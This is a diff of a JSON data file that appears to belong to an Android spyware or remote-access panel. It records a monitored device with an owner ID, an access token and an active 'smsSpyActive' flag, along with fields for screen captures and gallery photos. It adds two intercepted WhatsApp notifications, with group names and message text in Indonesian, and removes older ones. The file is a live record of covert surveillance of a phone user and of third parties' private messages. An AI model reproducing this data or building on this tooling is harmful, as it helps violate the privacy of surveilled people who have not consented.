@@ -4,7 +4,7 @@
     "deviceName": "HP-AIM-7C2F",
     "ownerUsername": "51a6566b-13c6-424c-8f68-421c28fdc099",
     "token": "5c459e8712f2a7ee2b4192ea89156763",
-    "lastSeen": 1775040727570,
+    "lastSeen": 1775040732951,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-01T10:32:40.020Z",
@@ -20,6 +20,22 @@
     "lastScreenFrame": null,
     "smsSpyActive": true,
     "smsMessages": [
+      {
+        "appName": "WhatsApp",
+        "sender": "‎GB ISIAN ZAYN X OWN [6] (95 pesan): ~ Langz own GB 7",
+        "content": "11 5-9.5 no evmetps fpt android only no makro\n#b",
+        "time": "01/04 18:52",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1775040732974
+      },
+      {
+        "appName": "WhatsApp",
+        "sender": "‎main botwiee bersama (12169 pesan): ~ 🕷️",
+        "content": "papayab🥺🥺",
+        "time": "01/04 18:52",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1775040731329
+      },
       {
         "appName": "WhatsApp",
         "sender": "WhatsApp",
@@ -4003,22 +4019,6 @@
         "time": "01/04 18:32",
         "pkg": "com.whatsapp",
         "receivedAt": 1775039579580
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "WhatsApp",
-        "content": "Memeriksa pesan baru",
-        "time": "01/04 18:32",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1775039578402
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "WhatsApp",
-        "content": "‎‎14388 pesan dari 11 chat",
-        "time": "01/04 18:32",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1775039566807
       }
     ],
     "galleryPhotos": [],
